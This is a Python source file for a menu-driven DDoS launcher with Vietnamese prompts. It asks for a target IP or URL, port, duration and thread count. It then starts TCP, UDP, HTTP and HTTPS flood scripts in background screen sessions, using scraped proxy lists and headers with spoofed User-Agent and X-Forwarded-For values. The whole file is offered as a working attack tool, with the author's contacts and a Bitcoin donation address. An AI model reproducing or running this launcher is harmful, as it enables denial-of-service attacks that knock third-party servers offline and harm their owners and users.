#!/usr/bin/env python3

from shutil import which
from urllib import parse
from os import system
import subprocess
import random
import os
import sys
import time
import json
import time
try: #pip3 install httpx requests speedtest colorama
	import speedtest
	import colorama
	import requests
	import httpx
except Exception as e:
	sys.exit(e)


class Color:
	colorama.init(autoreset=True)
	LB = colorama.Fore.LIGHTBLUE_EX
	LC = colorama.Fore.LIGHTCYAN_EX
	LG = colorama.Fore.LIGHTGREEN_EX
	LR = colorama.Fore.LIGHTRED_EX
	LY = colorama.Fore.LIGHTYELLOW_EX
	RESET = colorama.Fore.RESET


class Home:
	def __init__(self,
	help,
	dev):
		self.help = help
		self.dev = dev

	def styleText(self, text):
		for animation in text:
			sys.stdout.write(animation)
			sys.stdout.flush()
			if animation != ".":
				time.sleep(0.01)
			else:
				time.sleep(1)

	def home(self): # don't edit this banner lol
		print(f"""{Color.LG}
═════════════════════════
➟ Facebook: @Users.ViDucHung.ProFile
➟ Zalo: 0359822840
➟ Github: https://github.com/Viduchung
➟ Website: www.HungTricker.Xyz
═════════════════════════
❌ Nhập lệnh " start " để khởi động Tool.! ❌
""")
		while True:
			try:
				sys.stdout.write(Color.LB+"⌤"+Color.LR+"["+Color.LG+"Vi Đức Hùng""]"+Color.LB+"\n➠ "+Color.RESET)
				option = input()
				if option == 'START' or option == 'start':
					os.system('clear')
					Tool.bbos()
				elif option == 'ref' or option == 'REF':
					self.home()
				elif option == 'home' or option == 'HOME':
					self.home()
				elif option == 'clear' or option == 'CLEAR':
					os.system('clear')
					VDH_Tool.home()
				elif option == 'help' or option == 'HELP':
					print(self.help)
				elif option == 'dev' or option == 'DEV':
					print(self.dev)
				elif option == 'exit' or option == 'EXIT':
					subprocess.run(['pkill -f ViDucHung.py'], shell=True)
				elif option == 'stop' or option == 'STOP':
					subprocess.run(['pkill screen'], shell=True)
					print(f"{Color.LG} Vi Đức Hùng: Done!")
				elif option == "":
					pass
				else:
					print(Color.LR+"command: "+Color.LG+f"{option}"+Color.LR+" not found")
			except KeyboardInterrupt:
				sys.exit(0)

	def bbos(self):
		print(Color.LR+"\n\n[ "+Color.LG+"Hàng Free Không Nên Đòi Hỏi !"+Color.LR+" ]\n\n")
		print(Color.LR+"["+Color.LG+"01"+Color.LR+"]"+Color.LC+" DDoS New Version")
		print(Color.LR+"["+Color.LG+"02"+Color.LR+"]"+Color.LC+" DDoS Old Version")
		print("\n")
		while True:
			sys.stdout.write(Color.LB+"⌤"+Color.LR+"["+Color.LG+"Vi Đức Hùng""]"+Color.LB+"\n➠ "+Color.RESET)
			option = input()
			if option == '01' or option == '1':
				os.system('clear');self.vdh1()
			elif option == '02' or option == '2':
				os.system('clear');self.vdh2()
			elif option == 'ref' or option == 'REF':
				self.bbos()
			elif option == 'home' or option == 'HOME':
				VDH_Tool.home()
			elif option == 'clear' or option == 'CLEAR':
				os.system('clear')
				self.bbos()
			elif option == 'help' or option == 'HELP':
				print(self.help)
			elif option == 'dev' or option == 'DEV':
				print(self.dev)
			elif option == 'exit' or option == 'EXIT':
				subprocess.run(['pkill -f ViDucHung.py'], shell=True)
			elif option == 'stop' or option == 'STOP':
				subprocess.run(['pkill screen'], shell=True)
				print(f"{Color.LG} Vi Đức Hùng: Done!")
			elif option == "":
				pass
			else:
				print(Color.LR+"command: "+Color.LG+f"{option}"+Color.LR+" not found")
		
class Tool:
	def __init__(self,
	help,
	dev,
	headers):
		self.help = help
		self.dev = dev
		self.headers = headers

	def proxy(self, new):
		try:
			with open("vdh/url.json", 'r') as p:
				read_url = p.read()
				readjson = json.loads(read_url)
		except FileNotFoundError:
			sys.exit(f"{Color.LR}ERROR:{Color.RESET} File: 'vdh' NotFound")
		if new == 'ref' or new == 'REF' or new == 'clear' or new == 'CLEAR':
			os.system('clear')
			F_Tool.styleText("[*] Downloading New Proxy...")
		else:
			F_Tool.styleText("[*] Downloading All Proxy...")
		try:
			http  = requests.get(readjson['Proxies'][0]['url'], headers=self.headers).text
			http += requests.get(readjson['Proxies'][1]['url'], headers=self.headers).text
			http += requests.get(readjson['Proxies'][2]['url'], headers=self.headers).text
			http += requests.get(readjson['Proxies'][3]['url'], headers=self.headers).text
			https = requests.get(readjson['Proxies'][4]['url'], headers=self.headers).text
			https += requests.get(readjson['Proxies'][5]['url'], headers=self.headers).text
			https += requests.get(readjson['Proxies'][6]['url'], headers=self.headers).text
			https +=  requests.get(readjson['Proxies'][7]['url'], headers=self.headers).text
			socks4  = requests.get(readjson['Proxies'][8]['url'], headers=self.headers).text
			socks4 += requests.get(readjson['Proxies'][9]['url'], headers=self.headers).text
			socks4 += requests.get(readjson['Proxies'][10]['url'], headers=self.headers).text
			socks4 += requests.get(readjson['Proxies'][11]['url'], headers=self.headers).text
			socks5 = requests.get(readjson['Proxies'][12]['url'], headers=self.headers).text
			socks5 += requests.get(readjson['Proxies'][13]['url'], headers=self.headers).text
			socks5 += requests.get(readjson['Proxies'][14]['url'], headers=self.headers).text
			socks5 += requests.get(readjson['Proxies'][15]['url'], headers=self.headers).text
			os.system('clear')
		except requests.exceptions.ConnectionError:
			sys.exit(Color.LR+"Error: Check your Internet Connection.")


	def vdh1(self):
		print(f"""{Color.LG}
═════════════════════════
➟ Lệnh " HELP " Để Xem Full Lệnh
➟ Lệnh " EXIT " Để Thoát
➟ Lệnh " STOP " Để Dừng DDOS
═════════════════════════
""")
		print(Color.LR+"["+Color.LG+"01"+Color.LR+"]"+Color.LC+" TCP Port")
		print(Color.LR+"["+Color.LG+"02"+Color.LR+"]"+Color.LC+" UDP Port")
		print(Color.LR+"["+Color.LG+"03"+Color.LR+"]"+Color.LC+" HTTP")
		print(Color.LR+"["+Color.LG+"00"+Color.LR+"]"+Color.LC+" Return")
		print("\n")
		while True:
			sys.stdout.write(Color.LB+"⌤"+Color.LR+"["+Color.LG+"Vi Đức Hùng""]"+Color.LB+"\n➠ "+Color.RESET)
			option = input()
			if option == '01' or option == '1':
				try:
					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
					port = int(input(f"{Color.LG} [>] Port: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					size = int(input(f"{Color.LG} [>] Size: "+Color.RESET))
					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
					subprocess.run([f'screen -dm python3 vdh/PEMNEW/tcp {ip} {port} {floodtime} {size} {thread}'], shell=True)
					print(Color.LG+f"\n Vi Đức Hùng: Done!\n")
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option == '02' or option == '2':
				try:
					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
					port = int(input(f"{Color.LG} [>] Port: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					size = int(input(f"{Color.LG} [>] Size: "+Color.RESET))
					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
					subprocess.run([f'screen -dm python3 vdh/PEMNEW/udp {ip} {port} {floodtime} {size} {thread}'], shell=True)
					print(Color.LG+f"\n Vi Đức Hùng: Done!\n")
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option == '03' or option == '3':
				try:
					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
					port = int(input(f"{Color.LG} [>] Port: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
					subprocess.run([f'screen -dm python3 vdh/PEMNEW/http {ip} {port} {floodtime} {thread}'], shell=True)
					print(Color.LG+f"\n Vi Đức Hùng: Done!\n")
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option == 'ref' or option == 'REF':
				self.vdh1()
			elif option == 'home' or option == 'HOME':
				VDH_Tool.home()
			elif option == 'clear' or option == 'CLEAR':
				os.system('clear')
				self.vdh1()
			elif option == 'help' or option == 'HELP':
				print(self.help)
			elif option == 'dev' or option == 'DEV':
				print(self.dev)
			elif option == 'exit' or option == 'EXIT':
				subprocess.run(['pkill -f ViDucHung.py'], shell=True)
			elif option == 'stop' or option == 'STOP':
				subprocess.run(['pkill screen'], shell=True)
				print(f"{Color.LG} Vi Đức Hùng: Done!")
			elif option == '00' or option == '0':
				os.system('clear');self.bbos()
			elif option == "":
				pass
			else:
				print(Color.LR+"command: "+Color.LG+f"{option}"+Color.LR+" not found")

	def vdh2(self):
		print(f"""{Color.LG}
═════════════════════════
➟ Lệnh " HELP " Để Xem Full Lệnh
➟ Lệnh " EXIT " Để Thoát
➟ Lệnh " STOP " Để Dừng DDOS
═════════════════════════
""")
		print(Color.LR+"["+Color.LG+"01"+Color.LR+"]"+Color.LC+" HTTPS 01")
		print(Color.LR+"["+Color.LG+"02"+Color.LR+"]"+Color.LC+" HTTPS 02")
		print(Color.LR+"["+Color.LG+"00"+Color.LR+"]"+Color.LC+" Return")
		print("\n")
		http_proxy = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
		while True:
			sys.stdout.write(Color.LB+"⌤"+Color.LR+"["+Color.LG+"Vi Đức Hùng""]"+Color.LB+"\n➠ "+Color.RESET)
			option = input()
			if option == '01' or option == '1':
				try:
					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					VDH_Tool.styleText("\n [*] Chờ tí nhé...\n")
					with open("vdh/http.txt", 'w') as p:
						p.write(httpx.get(http_proxy).text)
					subprocess.run([f'screen -dm node vdh/PEM/https1 GET {url} vdh/http.txt {floodtime} 64 1'], shell=True)
					print(Color.LG+f"\n Vi Đức Hùng: Done!\n")
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option == '02' or option == '2':
				try:
					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					VDH_Tool.styleText("\n [*] Chờ tí nhé...\n")
					with open("vdh/http.txt", 'w') as p:
						p.write(httpx.get(http_proxy).text)
					subprocess.run([f'screen -dm node vdh/PEM/https2 {url} {floodtime} 1'], shell=True)
					print(Color.LG+f"\n Vi Đức Hùng: Done!\n")
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option == 'ref' or option == 'REF':
				self.vdh2()
			elif option == 'home' or option == 'HOME':
				VDH_Tool.home()
			elif option == 'clear' or option == 'CLEAR':
				os.system('clear')
				self.vdh2()
			elif option == 'help' or option == 'HELP':
				print(self.help)
			elif option == 'dev' or option == 'DEV':
				print(self.dev)
			elif option == 'exit' or option == 'EXIT':
				subprocess.run(['pkill -f ViDucHung.py'], shell=True)
			elif option == 'stop' or option == 'STOP':
				subprocess.run(['pkill screen'], shell=True)
				print(f"{Color.LG} Vi Đức Hùng: Done!")
			elif option == '00' or option == '0':
				os.system('clear');self.bbos()
			elif option == "":
				pass
			else:
				print(Color.LR+"command: "+Color.LG+f"{option}"+Color.LR+" not found")


def spoof_useragents():
	spoof_ip = []
	ip = []
	ip1, ip2, ip3, ip4 = random.randint(1,255), random.randint(1,255), random.randint(1,255), random.randint(1,255)
	ip.append(ip1), ip.append(ip2), ip.append(ip3), ip.append(ip4)

	IP = str(ip[0])+"."+str(ip[1])+"."+str(ip[2])+"."+str(ip[3])
	spoof_ip.append(IP)

	useragents = ['Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)',
	'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:16.0.1) Gecko/20121011 Firefox/21.0.1',
	'Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0',
	'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko)',
	'Chrome/34.0.1847.116 Safari/537.36',
	'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10',
	'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:16.0.1) Gecko/20121011 Firefox/21.0.1',
	'Mozilla/5.0 (Windows; U; Windows NT 5.1; ja-JP) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4',
	'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.13) Gecko/20101213 Opera/9.80 (Windows NT 6.1; U; zh-tw) Presto/2.7.62 Version/11.01']

	return {
	'Connection': 'Keep-Alive',
	'Cache-control': 'no-cache',
	'User-Agent': random.choice(useragents).strip(),
	'X-Forwarded-For': random.choice(spoof_ip)
	}

def main(): 
	VDH_Tool.styleText("🌚 Đang Vào Tool...\n\n")
	pkgs = ['screen', 'node']
	install = True
	for pkg in pkgs:
		ur_mom = which(pkg)
		if ur_mom == None:
			VDH_Tool.styleText(f"[!] {pkg} is not installed!\n")
			install = False
		else:
			pass
	if install == False:
		sys.exit(f'\n[?] Error? try:{Color.LG} sh vdh.sh')
	else:pass
	try:
		script = True
		with open('vdh') as important:pass
	except IsADirectoryError:pass
	except FileNotFoundError:
		print(f"{Color.LR}[CRITICAL ERROR]:{Color.RESET} File: 'vdh' NotFound")
		print("\n[+] Please download on GitHub, or git clone: https://github.com/Viduchhung/viduchung.git\n")
		os.remove(f'{__file__}')
		script = False
	if script == False:sys.exit()
	else:pass
	VDH_Tool.home()


if __name__ == '__main__':
	commands = f"""{Color.LC}HOME{Color.LR} ~>{Color.LY}Back to home
{Color.LC}REF{Color.LR} ~> {Color.LY}Refresh the menu
{Color.LC}CLEAR{Color.LR} ~> {Color.LY}Clear your face xd
{Color.LC}EXIT{Color.LR} ~> {Color.LY}Exit the program
{Color.LC}STOP{Color.LR} ~> {Color.LY}Stop your Attack
{Color.LC}DEV{Color.LR} ~> {Color.LY}Contact/Support dev"""
	dev = f"""{Color.LC}Telegram{Color.LR}: {Color.LY}https://t.me/FDc0d3
{Color.LC}New[BTC]Address{Color.LR}: {Color.LY}32FGCnt4uwkkByWuH8V4qyCSfynm1iVsmB"""
	VDH_Tool = Home(commands, dev)
	Tool = Tool(commands, dev, spoof_useragents())
	main()
